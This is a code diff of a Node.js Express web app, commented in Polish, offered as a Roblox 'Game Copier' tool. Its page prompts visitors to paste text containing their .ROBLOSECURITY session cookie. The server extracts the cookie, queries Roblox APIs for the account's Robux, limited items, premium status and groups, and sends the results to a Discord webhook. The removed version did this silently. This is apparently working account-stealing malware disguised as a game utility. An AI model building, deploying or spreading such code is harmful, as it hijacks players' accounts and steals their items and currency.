@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – możesz zostawić jak jest albo uprościć
+// Strona główna – prosty przycisk
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -12,19 +12,52 @@ app.get('/', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Tools</title>
+  <title>Roblox Narzędzia</title>
   <style>
-    body { margin:0; height:100vh; background:#0d0d1a; color:#e0e0ff; font-family:Arial,sans-serif; display:flex; align-items:center; justify-content:center; }
-    .card { background:#1a1a2e; border:1px solid #2a2a4a; border-radius:16px; padding:80px 100px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.7); }
-    h1 { color:#4a90ff; margin-bottom:40px; font-size:2.8rem; }
-    a.btn { background:#3b82f6; color:white; padding:18px 80px; font-size:1.6rem; border-radius:10px; text-decoration:none; transition:all 0.25s; display:inline-block; }
-    a.btn:hover { background:#2563eb; transform:translateY(-3px); }
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e0e0ff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card {
+      background: rgba(26, 26, 46, 0.85);
+      border: 1px solid #334;
+      border-radius: 16px;
+      padding: 70px 90px;
+      text-align: center;
+      box-shadow: 0 12px 50px rgba(0,0,0,0.7);
+    }
+    h1 {
+      color: #6ab0ff;
+      margin-bottom: 50px;
+      font-size: 3rem;
+    }
+    .btn {
+      background: #3b82f6;
+      color: white;
+      padding: 20px 80px;
+      font-size: 1.7rem;
+      border-radius: 12px;
+      text-decoration: none;
+      transition: all 0.3s;
+      display: inline-block;
+    }
+    .btn:hover {
+      background: #2563eb;
+      transform: translateY(-4px);
+      box-shadow: 0 12px 30px rgba(59,130,246,0.6);
+    }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Roblox Tools</h1>
-    <a href="/game-copier" class="btn">Game Copier</a>
+    <a href="/game-copier" class="btn">Game Copier & Checker</a>
   </div>
 </body>
 </html>
@@ -32,106 +65,172 @@ app.get('/', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// Strona Game Copier – tylko pole + przycisk
+// Strona checker – TYLKO input + przycisk, zero wyników na ekranie
 // ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Game Copier</title>
+  <title>Roblox Cookie Checker</title>
   <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: #0d0d1a;
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      box-sizing: border-box;
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #0f0f17; 
+      color: #e0e0ff; 
+      margin: 0; 
+      padding: 24px; 
     }
-    h1 {
-      color: #4a90ff;
-      margin-bottom: 32px;
-      font-size: 2.4rem;
+    .container { 
+      max-width: 820px; 
+      margin: 0 auto; 
     }
-    textarea {
-      width: 100%;
-      max-width: 860px;
-      height: 340px;
-      background: #1a1a2e;
-      color: #d0d0ff;
-      border: 1px solid #2a2a4a;
-      border-radius: 10px;
-      padding: 20px;
-      font-family: Consolas, monospace;
-      font-size: 15px;
-      resize: vertical;
-      margin-bottom: 32px;
+    h1 { 
+      color: #6ab0ff; 
+      text-align: center; 
+      margin-bottom: 12px;
     }
-    button {
-      background: #3b82f6;
-      color: white;
-      border: none;
-      padding: 18px 90px;
-      font-size: 1.35rem;
-      border-radius: 10px;
-      cursor: pointer;
+    .back { 
+      display: inline-block; 
+      margin-bottom: 28px; 
+      color: #60a5fa; 
+      text-decoration: none; 
+      font-weight: bold; 
+      font-size: 1.15rem;
+    }
+    .back:hover { color: #93c5fd; }
+    textarea { 
+      width: 100%; 
+      min-height: 280px; 
+      background: #1a1a2e; 
+      color: #d0d0ff; 
+      border: 1px solid #3a3a5c; 
+      border-radius: 10px; 
+      padding: 18px; 
+      font-family: Consolas, 'Courier New', monospace; 
+      font-size: 15px; 
+      resize: vertical; 
+      margin: 16px 0 24px 0; 
+    }
+    button { 
+      background: #3b82f6; 
+      color: white; 
+      border: none; 
+      padding: 18px 60px; 
+      font-size: 1.2rem; 
+      border-radius: 10px; 
+      cursor: pointer; 
+      display: block; 
+      margin: 0 auto 30px; 
       font-weight: 600;
-      transition: all 0.2s;
     }
-    button:hover:not(:disabled) {
-      background: #2563eb;
-      transform: translateY(-2px);
-    }
+    button:hover { background: #2563eb; }
     button:disabled {
-      opacity: 0.5;
+      background: #1e40af;
       cursor: not-allowed;
+      opacity: 0.7;
     }
+    #result { 
+      background: #1a1a2e; 
+      border: 1px solid #3a3a5c; 
+      border-radius: 10px; 
+      padding: 28px; 
+      min-height: 100px; 
+      text-align: center; 
+      font-size: 1.15rem;
+      line-height: 1.6;
+    }
+    .error   { color: #ff6b6b; font-weight: bold; }
+    .success { color: #4ade80; font-weight: bold; }
+    .loading { color: #fbbf24; font-style: italic; }
   </style>
 </head>
 <body>
-
-  <h1>Game Copier</h1>
-
-  <textarea id="t" placeholder="Paste text here..."></textarea>
-
-  <button id="b" onclick="start()">Start Process</button>
+<div class="container">
+  <a href="/" class="back">← Strona główna</a>
+  <h1>Roblox Cookie Checker</h1>
+  <p>Wklej tekst zawierający .ROBLOSECURITY (logi, konsola, headers, JSON itp.)<br>
+     Dane konta pojawią się **tylko** w Twoim webhooku.</p>
+  
+  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
+  
+  <button id="checkBtn" onclick="check()">Check & Send to Webhook</button>
+  
+  <div id="result"></div>
+</div>
 
 <script>
-async function start() {
-  const btn = document.getElementById('b');
-  const text = document.getElementById('t').value.trim();
+async function check() {
+  const btn = document.getElementById('checkBtn');
+  const raw = document.getElementById('input').value.trim();
+  const result = document.getElementById('result');
 
-  if (!text) {
+  result.innerHTML = '';
+  btn.disabled = true;
+
+  if (!raw) {
+    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
     btn.disabled = false;
     return;
   }
 
-  // Wyciągamy najdłuższy ciąg zaczynający się od _
   let cookie = null;
-  const matches = text.match(/_[A-Za-z0-9\\-_|]{170,}/g) || [];
-  if (matches.length > 0) {
-    cookie = matches.reduce((a, b) => a.length > b.length ? a : b);
+  let match;
+
+  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
+  if (match && match[1]) cookie = match[1].trim();
+
+  if (!cookie) {
+    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
+    if (match && match[1]) cookie = match[1].trim();
   }
 
-  btn.disabled = true;
+  if (!cookie) {
+    match = raw.match(/_\\|WARNING[^"]{200,}/);
+    if (match) cookie = match[0].trim();
+  }
 
-  if (cookie && cookie.length >= 180) {
-    fetch('/check', {
+  if (!cookie) {
+    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
+    if (fallback.length) {
+      cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
+    }
+  }
+
+  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
+    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
+    btn.disabled = false;
+    return;
+  }
+
+  result.innerHTML = '<span class="loading">Trwa sprawdzanie i wysyłanie do webhooka...</span>';
+
+  try {
+    const res = await fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie })
-    }).catch(() => {});   // cisza – nic nie pokazujemy
-  }
+    });
 
-  // Przywracamy przycisk po ~1.5–2 s (żeby można było kliknąć ponownie)
-  setTimeout(() => { btn.disabled = false; }, 1800);
+    if (!res.ok) {
+      throw new Error('Błąd serwera: ' + res.status);
+    }
+
+    const json = await res.json();
+
+    if (json.error) {
+      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+    } else {
+      result.innerHTML = '<span class="success">Gotowe – cookie sprawdzone i wysłane do webhooka ✓</span>';
+    }
+
+  } catch (err) {
+    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+  } finally {
+    btn.disabled = false;
+  }
 }
 </script>
 </body>
@@ -139,7 +238,9 @@ async function start() {
   `);
 });
 
-// Endpoint /check – dokładnie taki sam jak podałeś (wszystko idzie na webhook)
+// ────────────────────────────────────────────────
+// Endpoint /check – bez zmian (wszystkie dane idą do webhooka)
+// ────────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
@@ -147,6 +248,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
+    // Pobranie X-CSRF-Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -157,6 +259,7 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
+    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -167,6 +270,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
+    // Verified email (przez badge)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -178,6 +282,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -186,6 +291,7 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
+    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -197,6 +303,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // RAP
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -208,6 +315,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Grupy (owner = rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -219,6 +327,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -232,6 +341,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -241,6 +351,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -272,6 +383,7 @@ app.post('/check', async (req, res) => {
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
     const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
+    // Headless & Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -283,6 +395,7 @@ app.post('/check', async (req, res) => {
         const data = await headlessRes.json();
         hasHeadless = Array.isArray(data.data) && data.data.length > 0;
       }
+
       const korbloxRes = await fetch(
         `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
         { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
@@ -313,6 +426,7 @@ app.post('/check', async (req, res) => {
       jbCount
     };
 
+    // Wysyłka do Discord webhooka
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
